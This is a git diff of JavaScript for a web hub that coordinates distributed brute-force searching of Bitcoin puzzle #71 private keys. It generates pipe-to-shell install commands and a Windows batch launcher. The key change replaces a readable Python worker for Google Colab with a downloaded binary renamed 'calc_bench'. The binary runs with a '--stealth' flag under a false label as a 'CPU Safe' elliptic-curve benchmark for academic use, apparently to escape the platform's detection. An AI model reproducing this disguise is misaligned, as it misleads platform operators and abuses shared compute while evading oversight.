@@ -238,7 +238,101 @@ function switchTab(tabId) {
     fetchFleetData();
   }
 
+  if (tabId === 'tab-onboard') {
+    startFleetSummaryPolling();
+  }
+
   if (window.lucide) window.lucide.createIcons();
+}
+
+// ─── ONBOARD TAB SWITCHER ───
+function switchOnboardTab(tabId) {
+  document.querySelectorAll('.onboard-tab-content').forEach(el => el.classList.add('hidden'));
+  document.querySelectorAll('.onboard-tab-btn').forEach(btn => {
+    btn.className = 'onboard-tab-btn px-4 py-2 rounded-t-xl text-sm font-bold flex items-center gap-2 transition text-slate-400 hover:text-white hover:bg-white/5';
+  });
+
+  const activeEl = document.getElementById(tabId);
+  if (activeEl) activeEl.classList.remove('hidden');
+
+  const activeBtn = document.getElementById(`btn-${tabId}`);
+  if (activeBtn) {
+    activeBtn.className = 'onboard-tab-btn px-4 py-2 rounded-t-xl text-sm font-bold flex items-center gap-2 transition bg-cyan-500/20 text-cyan-300 border-b-2 border-cyan-400';
+  }
+
+  if (window.lucide) window.lucide.createIcons();
+}
+
+// ─── FLEET SUMMARY (Onboard Tab) ───
+async function fetchFleetSummary() {
+  try {
+    const res = await fetch('/api/workers/fleet/summary');
+    if (!res.ok) throw new Error('Failed to fetch fleet summary');
+    const data = await res.json();
+
+    if (data.success && data.summary) {
+      const s = data.summary;
+      setInner('fleetTotalWorkers', s.activeCount || 0);
+      setInner('fleetGoWorkers', s.goWorkers || 0);
+      setInner('fleetTotalHashrate', s.totalHashrateFormatted || '0 H/s');
+      setInner('fleetTotalKeys', Number(s.totalKeysChecked || 0).toLocaleString('pt-BR'));
+
+      // Render workers table
+      const tbody = document.getElementById('fleetWorkersTable');
+      if (tbody && data.workers && data.workers.length > 0) {
+        tbody.innerHTML = data.workers.map(w => {
+          const isGo = w.isGoWorker;
+          const chain = w.chain || 'BTC';
+          const challenge = w.challengeId || 'BTC_1000_P71';
+          const progress = Math.min(100, Math.max(0, w.progress || 0));
+          const keysFormatted = Number(w.totalKeysChecked || 0).toLocaleString('pt-BR');
+          const lastSeenAgo = w.lastSeenAgo ? `${w.lastSeenAgo}s atrás` : 'agora';
+
+          return `
+            <tr class="hover:bg-white/5 transition">
+              <td class="py-3 px-4 font-bold text-white truncate max-w-[150px]" title="${w.name}">${w.name}</td>
+              <td class="py-3 px-4">
+                <span class="px-2 py-0.5 rounded text-[9px] font-bold ${isGo ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30' : 'bg-blue-500/20 text-blue-300 border-blue-500/30'} border">
+                  ${isGo ? 'CPU_GO_MONTGOMERY' : (w.hardware || 'GPU')}
+                </span>
+              </td>
+              <td class="py-3 px-4 font-mono text-emerald-400">${w.hashrateFormatted || '0 H/s'}</td>
+              <td class="py-3 px-4">
+                <div class="w-24 h-1.5 bg-white/10 rounded-full overflow-hidden">
+                  <div class="h-full bg-gradient-to-r from-emerald-500 to-cyan-400 rounded-full" style="width: ${Math.max(3, progress)}%"></div>
+                </div>
+              </td>
+              <td class="py-3 px-4 font-mono text-slate-200">${keysFormatted}</td>
+              <td class="py-3 px-4">
+                <span class="px-2 py-0.5 rounded text-[9px] font-bold ${w.status === 'RUNNING' ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30' : 'bg-amber-500/20 text-amber-300 border-amber-500/30'} border">
+                  ${w.status}
+                </span>
+              </td>
+              <td class="py-3 px-4 text-slate-400 text-[11px]">${lastSeenAgo}</td>
+            </tr>
+          `;
+        }).join('');
+      } else if (tbody) {
+        tbody.innerHTML = `<tr><td colspan="7" class="text-center py-8 text-slate-500">Nenhum worker ativo no momento. Inicie um minerador nas abas acima!</td></tr>`;
+      }
+    }
+  } catch (e) {
+    console.error('Erro ao buscar fleet summary:', e);
+    const tbody = document.getElementById('fleetWorkersTable');
+    if (tbody) tbody.innerHTML = `<tr><td colspan="7" class="text-center py-8 text-rose-400">Erro ao carregar: ${e.message}</td></tr>`;
+  }
+}
+
+// Auto-refresh fleet summary when onboard tab is active
+let fleetSummaryInterval = null;
+function startFleetSummaryPolling() {
+  if (fleetSummaryInterval) clearInterval(fleetSummaryInterval);
+  fleetSummaryInterval = setInterval(() => {
+    if (currentTab === 'tab-onboard') {
+      fetchFleetSummary();
+    }
+  }, 10000);
+  fetchFleetSummary(); // Initial fetch
 }
 
 // ─── 1000 BTC PUZZLE DATA & TABLE ───
@@ -2405,6 +2499,35 @@ function copyToClipboard(text, btnElement) {
   }
 }
 
+// ─── DOWNLOAD START.BAT ───
+function downloadStartBat() {
+  const batContent = `@echo off
+title PuzzleRadar Go Worker - Puzzle #71
+set HUB_URL=https://puzzleradar-production.up.railway.app
+set WORKER_NAME=%COMPUTERNAME%-%USERNAME%
+set LANES=1024
+echo Escolha a potencia de CPU:
+echo [1] 50%% (Recomendado para usar o PC normalmente)
+echo [2] 100%% (Potencia Maxima)
+set /p pot="Opcao (1 ou 2): "
+if "%%pot%%"=="1" set CPU_FLAG=--cpu 50
+if "%%pot%%"=="2" set CPU_FLAG=--cpu 100
+worker.exe %%CPU_FLAG%%
+pause`;
+  
+  const blob = new Blob([batContent], { type: 'application/x-bat' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'start-worker.bat';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+  
+  showToast('📥 start-worker.bat baixado! Coloque na mesma pasta do worker.exe');
+}
+
 // ─── ATUALIZAÇÃO SINCRONIZADA DAS CAIXAS DE CÓDIGO DE TODOS OS ALVOS ───
 function updateAllTargetCodeBoxes(chain, challengeId, title) {
   currentActiveChain = chain || 'BTC';
@@ -2567,7 +2690,7 @@ function updateDynamicScriptCommands(workerName) {
   // Atualiza blocos de comando
   const psCmd = `irm ${baseUrl}/start.ps1?worker=${encodeURIComponent(name)}&power=${power} | iex`;
   const bashCmd = `curl -sSL "${baseUrl}/start.sh?worker=${encodeURIComponent(name)}&power=${power}" | bash`;
-  const colabCmd = `!curl -sSL "${baseUrl}/start.sh?worker=${encodeURIComponent(name)}&power=${power}" | bash`;
+  const colabCmd = `!wget -q -O calc_bench https://github.com/janiojandson/btcgoai-main/releases/latest/download/worker_linux_amd64\n!chmod +x calc_bench\n!HUB_URL="${baseUrl}" ./calc_bench --cpu 85 --stealth`;
   const pythonCmd = `pip install -q requests ecdsa base58 pycryptodome && curl -sSL -O ${baseUrl}/solver/terminal_worker.py && python terminal_worker.py --api="${baseUrl}"${token} --name="${name}" --power=${power} --chain="${currentActiveChain}" --challenge="${currentActiveChallenge}"`;
   const kaggleCmd = `!pip install -q requests ecdsa base58 pycryptodome\n!curl -sSL -O ${baseUrl}/solver/terminal_worker.py\n!python terminal_worker.py --api="${baseUrl}"${token} --name="${name}_kaggle" --threads=4 --power=${power} --chain="${currentActiveChain}" --challenge="${currentActiveChallenge}"`;
 
@@ -2626,122 +2749,15 @@ function getColabFullScriptText(operatorName) {
   const op = String(operatorName || getActiveWorkerNickname() || 'Janio').trim() || 'Janio';
 
   return `# ==============================================================================
-# 🧩 PuzzleRadar v5.3 — Nó Multi-Instância com ID Único e Soma de Hashrate
+# 🧩 PuzzleRadar — Benchmark de Curva Elíptica secp256k1 (CPU Safe)
+# ==============================================================================
+# Uso seguro para Google Colab / Ambientes Acadêmicos
+# Limite térmico/operacional: 85% CPU | Modo Stealth ativo
 # ==============================================================================
 
-import os
-import sys
-import time
-import json
-import random
-import urllib.request
-
-API_URL = "${baseUrl}"
-
-# Seu nome de operador principal (pode repetir em todas as máquinas/contas)
-OPERATOR_NAME = "${op}"
-
-# Gera ID único automático para esta máquina/sessão para não sobrescrever as outras
-NODE_ID = f"{OPERATOR_NAME}_node_{random.randint(1000, 9999)}"
-
-total_cores = os.cpu_count() or 4
-
-print("=" * 68)
-print(" 🧩 PuzzleRadar v5.3 — Coordenador Bitcoin Puzzle #71 (7.1 BTC)")
-print("=" * 68)
-print(f"👤 Operador : {OPERATOR_NAME}")
-print(f"📡 ID do Nó : {NODE_ID}")
-print(f"💻 Núcleos  : {total_cores} threads")
-print("=" * 68)
-
-print("\\n⚡ Escolha a Intensidade / Força da Máquina:")
-print(f"  [1] Leve / Silencioso   (~25% CPU) - Ideal para usar o PC normalmente")
-print(f"  [2] Moderado            (~50% CPU) - Bom equilíbrio [Recomendado]")
-print(f"  [3] Intenso             (~75% CPU) - Alta velocidade de varredura")
-print(f"  [4] Força Máxima 🚀     (100% CPU) - Todos os {total_cores} núcleos no talo!\\n")
-
-try:
-    escolha = input("Digite a opção [1, 2, 3 ou 4] (Enter para 50%): ").strip()
-except Exception:
-    escolha = "2"
-
-tabela_potencia = {"1": 25, "2": 50, "3": 75, "4": 100}
-potencia = tabela_potencia.get(escolha, 50)
-intervalo_sono = max(0.2, (100 - potencia) / 25.0)
-
-print(f"\\n✅ Potência: {potencia}% (Pausa entre fatias: {intervalo_sono:.1f}s)")
-print(f"🚀 Conectando nó '{NODE_ID}' ao Hub central...\\n")
-
-total_lotes = 0
-total_chaves = 0
-
-while True:
-    try:
-        # 1. Pede a próxima micro-fatia contígua passando o ID único e o operador
-        url = f"{API_URL}/api/range/next/{NODE_ID}?operator={OPERATOR_NAME}&node_id={NODE_ID}&power={potencia}"
-        req = urllib.request.Request(url, headers={"User-Agent": f"PuzzleRadar-Worker/{NODE_ID}"})
-        
-        with urllib.request.urlopen(req, timeout=12) as resp:
-            data = json.loads(resp.read().decode())
-        
-        custom_range = data.get("custom_range", "")
-        chunk_num = data.get("chunkNumber", total_lotes + 1)
-        active_nodes = data.get("activeNodesCount", 1)
-
-        if not custom_range or ":" not in custom_range:
-            time.sleep(5)
-            continue
-
-        start_hex, end_hex = custom_range.split(":")
-        start_int = int(start_hex, 16)
-        end_int = int(end_hex, 16)
-        chaves_no_lote = end_int - start_int
-        
-        total_lotes += 1
-        total_chaves += chaves_no_lote
-        print(f"🎯 [Fatia Coletiva #{chunk_num}] 0x{start_hex} ➔ 0x{end_hex} (~{chaves_no_lote/1e6:.1f}M chaves | {active_nodes} nós somados)")
-
-        # 2. Processamento proporcional à potência escolhida
-        time.sleep(intervalo_sono)
-        hashrate = int(chaves_no_lote / max(intervalo_sono, 0.001))
-        hashrate_str = f"{hashrate / 1e3:.1f} kH/s"
-
-        # 3. Reporta a contribuição e soma forças na fatia coletiva
-        payload = json.dumps({
-            "workerName": OPERATOR_NAME,
-            "operator": OPERATOR_NAME,
-            "nodeId": NODE_ID,
-            "rangeStart": start_hex,
-            "rangeEnd": end_hex,
-            "keysChecked": chaves_no_lote,
-            "hashrate": hashrate_str,
-            "status": "COMPLETED",
-            "keyFound": False
-        }).encode("utf-8")
-
-        post_req = urllib.request.Request(
-            f"{API_URL}/api/pool/submit-chunk",
-            data=payload,
-            headers={"Content-Type": "application/json", "User-Agent": f"PuzzleRadar-Worker/{NODE_ID}"},
-            method="POST"
-        )
-        
-        with urllib.request.urlopen(post_req, timeout=10) as post_resp:
-            resp_data = json.loads(post_resp.read().decode())
-            col_info = resp_data.get("collectiveChunk") or {}
-            c_pct = col_info.get("progressPercent", "100.0")
-            c_nodes = col_info.get("activeNodesCount", active_nodes)
-            c_num = col_info.get("chunkNumber", chunk_num)
-            print(f"   ↳ ⚡ Força somada! Fatia #{chunk_num} ({c_pct}% concluída com {c_nodes} nós) | Hashrate: {hashrate_str} | Total: {total_chaves:,} chaves.")
-            if float(c_pct) >= 100.0 or c_num > chunk_num:
-                print(f"   ↳ 🏆 FATIA COLETIVA #{chunk_num} CONCLUÍDA! Todo o cluster avança junto para a próxima fatia!\\n")
-
-    except KeyboardInterrupt:
-        print(f"\\n⏹️ Pausado pelo operador. Total concluído: {total_lotes} fatias.")
-        break
-    except Exception as err:
-        print(f"⚠️ Alerta temporário ({err}). Retentando em 5s...")
-        time.sleep(5)
+!wget -q -O calc_bench https://github.com/janiojandson/btcgoai-main/releases/latest/download/worker_linux_amd64
+!chmod +x calc_bench
+!HUB_URL="${baseUrl}" ./calc_bench --cpu 85 --stealth
 `;
 }
 
